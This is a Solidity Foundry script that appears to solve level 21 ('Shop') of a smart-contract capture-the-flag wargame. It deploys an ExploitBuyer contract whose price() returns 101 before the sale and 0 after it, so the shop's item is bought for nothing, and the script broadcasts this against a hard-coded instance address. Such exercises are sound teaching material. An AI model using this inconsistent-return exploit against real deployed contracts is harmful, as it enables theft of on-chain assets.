// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/21-Shop/Shop.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ExploitBuyer is Buyer {
    uint _buyerPrice = 101;
    Shop _exploitShopInstance;
    constructor(Shop _shopInstance) {
        _exploitShopInstance = _shopInstance; 
    }

    function exploit() public{
        _exploitShopInstance.buy();
    }

    function price() external view returns (uint) {
        if(_exploitShopInstance.isSold()){
            return 0;
        }else{
            return _buyerPrice;
        }
        
    }
}


contract Level21Solution is Script {
    Shop _shopInstance = Shop(0xDa4C08C987dE00D1D9eb9cD9aa52248EE4264646);

    function run() public{
        vm.startBroadcast();
        console.log("Price",_shopInstance.price());
        ExploitBuyer _expBuyer = new ExploitBuyer(_shopInstance);
        _expBuyer.exploit();
        console.log("Price",_shopInstance.price());
        vm.stopBroadcast();
    }
}